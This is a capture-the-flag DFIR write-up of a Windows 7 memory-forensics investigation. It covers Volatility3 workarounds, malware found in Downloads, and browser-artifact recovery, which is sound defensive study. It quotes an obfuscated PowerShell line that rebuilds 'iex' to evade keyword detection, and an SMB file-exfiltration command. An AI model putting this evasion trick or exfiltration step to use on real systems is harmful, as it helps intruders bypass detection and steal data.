# HTB Sherlock: Recollection — Full Writeup

**Category:** DFIR / Memory Forensics | **Platform:** Hack The Box (Sherlock) | **Difficulty:** Easy | **Solved:** September 2026

---

## Synopsis

A single 4.5 GB Windows 7 memory image, no disk, no PCAP, no EDR — and a junior researcher's "safe" malware-analysis VM that turned out not to be so safe. Browser history recovered from memory shows the victim searching MalwareBazaar and installing a Wazuh agent — legitimate defensive research — right around the time a sample landed in their Downloads folder still named after its own SHA256 hash, MalwareBazaar's own download convention. Something in that session executed for real.

**Chain:** an obfuscated PowerShell one-liner reconstructs the alias `iex` for `Invoke-Expression` at runtime, without the literal string ever appearing → a targeted file is opened in Notepad, then an SMB exfiltration attempt to another host on the LAN fails → a base64-encoded PowerShell command defaces the machine with a calling-card message → a second payload disguised as a legitimate Windows binary (a one-letter typosquat) sits alongside BITS download artifacts → the attacker's own email surfaces in memory, sitting directly next to Facebook login-form remnants, naming-matched to the defacement string itself.

This one leaned hardest on *working around tool gaps* rather than following a clean plugin-to-plugin path — Volatility3 flatly refuses to parse console buffers on Windows 7, and the malicious file's own bytes were never recoverable from the image at all. Both dead ends had real workarounds, and both are worth knowing before you hit them on a live case.

---

## Tooling

Started with `bstrings.exe` (Eric Zimmerman) against the raw image using broad keyword/regex search files — it returned 4.4 million string hits in under nine minutes, which is a fast way to learn that a byte-level string scan with no structural awareness and an overly broad search list is not a triage strategy. Switched to Volatility3 for the rest of the investigation: `windows.info` → `windows.pstree` → `windows.cmdline` → `windows.netscan`, each plugin handing the next its pivot value.

Two purpose-built tools came out of this case, both pushed to [`dfir-tools`](https://github.com/9t0wl/dfir-tools):

- **`vol-triage.html`** — a single-file browser tool that loads any `vol3 -r csv` plugin output and auto-detects table shape from the header: process tables, network tables (with automatic repeat-IP beacon detection — this is what flagged a suspicious IP hit three separate times), and registry `printkey` dumps (with a toggle to strip the placeholder rows every hive-scan miss produces). Multiple exports stay open as tabs simultaneously, cross-referenced by PID, so pivoting between plugin outputs doesn't mean re-running Volatility or losing scrollback.
- **`strings2csv.py`** — wraps `strings` (both ASCII and UTF-16LE passes) into a CSV loadable by the tool above. Built specifically because `windows.consoles`/`windows.cmdscan` raise `NotImplementedError` on Windows 7 in the current Volatility3 release — those plugins hard-code which Windows versions they can parse a console's screen buffer for, and Win7 isn't on the list.

---

## Investigation

### The obfuscated alias

Two PowerShell processes existed on the box: one launched normally by `explorer.exe`, and a second spawned as a child of `cmd.exe` — the classic tell that something other than the interactive user is driving that second shell. Recovering what was actually typed into it meant confronting the Windows 7 gap above: `windows.consoles` and `windows.cmdscan` both exist specifically to recover console screen-buffer content, and both refused to run.

The workaround exploits how consoles actually work under the hood: it's `conhost.exe`, not the shell process itself, that owns the buffer. Matching `conhost.exe`'s process-creation timestamp against the `cmd.exe` session it belonged to identified the right process to target, and dumping its memory directly (`windows.memmap --dump --pid`) recovered the same data the plugin would have parsed, just without the structure-aware decoding — a plain `strings` pass across both encodings did the rest.

What came back was:

```
(gv '*MDR*').naMe[3,11,2]-joIN''
```

`gv` is the built-in alias for `Get-Variable`. `'*MDR*'` is a wildcard that matches exactly one PowerShell automatic variable — `$MaximumDriveCount`, the only one containing those letters. `.naMe` returns its name as the string `"MaximumDriveCount"`, and indexing that string at positions `[3, 11, 2]` pulls out `i`, `e`, `x` — reconstructing the alias `iex` (for `Invoke-Expression`) entirely at runtime. The literal strings `iex` and `Invoke-Expression` never appear anywhere in the command. It's a cheap, effective way to defeat any detection rule that only looks for those exact keywords.

### Exfiltration attempt and defacement

The same console buffer that answered the alias question turned out to hold most of the rest of the intrusion in one scrape. A targeted file — opened first in Notepad, presumably to confirm it was worth taking — was then piped toward another host on the local network over SMB:

```
type C:\Users\Public\Secret\Confidential.txt > \\<internal-host>\<share>\pass.txt
```

It failed immediately with a network-path error, but the attempt itself is the finding: a specific internal host was a planned exfil drop point, whether or not the transfer actually succeeded. The same buffer also contained a second obfuscation layer — a base64-encoded PowerShell command that decoded cleanly (cross-checked independently in a second tool rather than trusted on a single decode) to a calling-card defacement, writing a "hacked by" message into a world-writable path under `C:\Users\Public\`.

### The self-hashed malware and a dead end that wasn't

`windows.filescan` — which pool-scans for resident file objects rather than walking a live directory, so it turns up files that never showed up as running processes — surfaced an executable in the user's Downloads folder named after a 64-character hex string. That length is the tell: a SHA256 hash, and self-hash naming is exactly MalwareBazaar's own download convention. A matching `.zip` of the same hash sat alongside it, consistent with a download-and-extract.

Recovering the actual file bytes to compute an Imphash hit a real dead end: `windows.dumpfiles` against the file object's offset came back with an empty result table — no error, just nothing. That means the file object structure itself was captured in memory, proving the file existed and was referenced, but its data pages simply weren't resident at the moment the image was captured. There was nothing left to carve.

The fix didn't require the bytes at all. The SHA256 was already a known, publicly flagged sample — 61 of 71 vendors on VirusTotal — which supplied the Imphash and the PE's compile timestamp directly from its metadata. One correlation worth noting: VirusTotal's "first seen in the wild" timestamp for this exact sample lands on the *same calendar day* as this memory capture, roughly two hours earlier — this sample went public right around when this incident happened.

A second file in the same Downloads folder, sitting next to BITS transfer artifacts, was a one-letter typosquat of a legitimate Windows system process — the kind of masquerading that a simple hash-allowlist check against known system binaries in user-writable folders would catch immediately.

### Finding the needle: browser activity at scale

The last artifacts (an email address possibly tied to the attacker, and a security product the victim had researched) lived in Edge's rendered process memory rather than any structured log — plain browser activity, resident as strings. An initial keyword-scoped search across the full image caught an email address sitting directly next to Facebook login-form remnants — and the local part of that address matched the wording of the earlier defacement message almost exactly, a genuinely useful (if informal) attribution thread tying the intruder's own account back to the same machine.

The security-product search took one more step. A narrow keyword search for the literal category name came up empty — nobody searches "best SIEM," they search a product by name — so the search widened to capture every search-engine query string in the image instead. That came back with over 15,000 rows, almost all of them the same handful of queries duplicated across memory (browser cache, DOM copies, working-set duplicates). Rather than scroll a haystack, extracting just the query parameter and deduplicating at the command line (`sort | uniq -c | sort -rn`) collapsed it to a short, scannable list in seconds — and the actual product name (Wazuh, matching the earlier "installing a SIEM agent" hypothesis) sat right near the top, above generic searches for a compression tool and a base64 encoder that were part of the same session.

---

## Key Takeaways

- **A keyword-based detection rule for `iex`/`Invoke-Expression` is trivially defeated by runtime string reconstruction.** `Get-Variable` wildcard matching plus character indexing builds a sensitive keyword from unrelated data — the literal string never appears anywhere for a signature to catch.
- **When a console-parsing plugin fails due to an OS-version gap, the fix is dumping `conhost.exe`, not the shell process.** It's `conhost.exe` that actually owns the console screen buffer; match it to its shell via process-creation timestamp correlation.
- **`EPROCESS.ImageFileName` is capped at 15 characters** — a process running from a 64-character hash-named executable shows up truncated or unrecognizable in a process listing, which is exactly why this malware never stood out among the tracked processes and had to be found through file-object scanning instead.
- **A file hash is a pivot, not a dead end, even when the bytes can't be carved from the evidence itself.** VirusTotal supplied metadata (Imphash, compile timestamp, first-seen date) this investigation couldn't recover locally, and the first-seen timestamp became a real timeline data point.
- **Large result sets should be deduplicated before they're read, not scrolled.** A 15,000-row haystack of browser search-query duplicates collapsed to a short, readable list with a single `sort | uniq -c` pipeline.
- **Independently re-verify a decoded artifact when it matters** — a single base64 decode was cross-checked in a second tool before being treated as ground truth.

---

## Detection Opportunities

- Alert on a `cmd.exe`/`powershell.exe` child process chain that coexists with a user's own normal interactive shell session — the anomaly is in the ancestry, not the process name.
- Flag base64-encoded PowerShell one-liners that write to world-writable paths (`C:\Users\Public\...`) — legitimate administrative activity rarely takes this shape.
- Treat an SMB write attempt to an unfamiliar internal host as a detectable event on its own, independent of whether the transfer actually succeeds.
- Hash-allowlist known Windows system binary names and flag any executable in a user-writable location (Downloads, Temp, AppData) matching one by name but not by hash — the cheapest possible catch for a typosquatted system-process name.
- Sandbox discipline matters for security researchers themselves: a sample pulled from a public malware repository for "safe" analysis is still live malware, and this case is a reasonable argument for why that analysis never happens on a machine with real network access to anything else.
